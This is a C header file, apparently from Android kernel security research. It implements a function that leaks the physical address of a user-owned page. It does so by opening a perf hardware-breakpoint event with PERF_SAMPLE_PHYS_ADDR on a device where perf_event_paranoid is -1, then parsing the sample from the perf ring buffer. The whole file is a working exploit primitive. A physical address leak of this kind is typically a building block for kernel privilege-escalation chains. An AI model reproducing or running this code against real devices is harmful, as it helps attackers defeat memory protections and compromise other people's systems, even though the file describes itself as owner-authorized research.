/* pa_leak.h — physical address leak via perf hardware watchpoint.
 * Owner-authorized research on a spare device. Read-only w.r.t. kernel state.
 *
 * On this build perf_event_paranoid == -1, so an unprivileged process may open a
 * PERF_TYPE_BREAKPOINT event on a page it owns; the resulting sample's
 * PERF_SAMPLE_PHYS_ADDR field is filled by perf_virt_to_phys(addr), i.e. the
 * physical address of that page. Verified on-device: two distinct pages of one
 * mapping returned PHYS values exactly 0x2000 apart.
 */
#ifndef PA_LEAK_H
#define PA_LEAK_H

#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>

/* bionic does not ship linux/hw_breakpoint.h */
#ifndef HW_BREAKPOINT_W
#define HW_BREAKPOINT_R     1
#define HW_BREAKPOINT_W     2
#define HW_BREAKPOINT_RW    (HW_BREAKPOINT_R | HW_BREAKPOINT_W)
#define HW_BREAKPOINT_X     4
#define HW_BREAKPOINT_LEN_1 1
#define HW_BREAKPOINT_LEN_2 2
#define HW_BREAKPOINT_LEN_4 4
#define HW_BREAKPOINT_LEN_8 8
#endif

/* Returns the physical address of `page` (must be faulted in), or 0 on failure. */
static uint64_t leak_phys_page(void *page) {
    struct perf_event_attr a;
    memset(&a, 0, sizeof(a));
    a.type = PERF_TYPE_BREAKPOINT;
    a.size = sizeof(a);
    a.bp_type = HW_BREAKPOINT_W;
    a.bp_len = HW_BREAKPOINT_LEN_8;
    a.bp_addr = (uint64_t)(uintptr_t)page;
    a.sample_period = 1;
    a.sample_type = PERF_SAMPLE_ADDR | PERF_SAMPLE_PHYS_ADDR;
    a.disabled = 1;
    a.exclude_kernel = 1;
    a.exclude_hv = 1;

    int fd = (int)syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
    if (fd < 0) {
        fprintf(stderr, "leak_phys_page: perf_event_open failed: %s\n", strerror(errno));
        return 0;
    }
    size_t rbsz = 4096 * (1 + 2);
    struct perf_event_mmap_page *meta =
        mmap(NULL, rbsz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (meta == MAP_FAILED) {
        fprintf(stderr, "leak_phys_page: ring mmap failed: %s\n", strerror(errno));
        close(fd);
        return 0;
    }
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    *(volatile char *)page = 0x41;   /* trigger the watchpoint */
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    uint64_t phys = 0;
    char *base = (char *)meta;
    uint64_t head = meta->data_head;
    __sync_synchronize();
    uint64_t tail = meta->data_tail;
    while (tail < head) {
        struct perf_event_header *h = (struct perf_event_header *)
            (base + meta->data_offset + (tail % meta->data_size));
        if (h->size == 0) break;
        if (h->type == PERF_RECORD_SAMPLE) {
            /* sample_type = ADDR | PHYS_ADDR  =>  u64 addr, u64 phys_addr */
            unsigned char *p = (unsigned char *)h + sizeof(*h);
            memcpy(&phys, p + 8, 8);
            break;
        }
        tail += h->size;
    }
    meta->data_tail = head;
    munmap(meta, rbsz);
    close(fd);
    return phys;
}

#endif /* PA_LEAK_H */
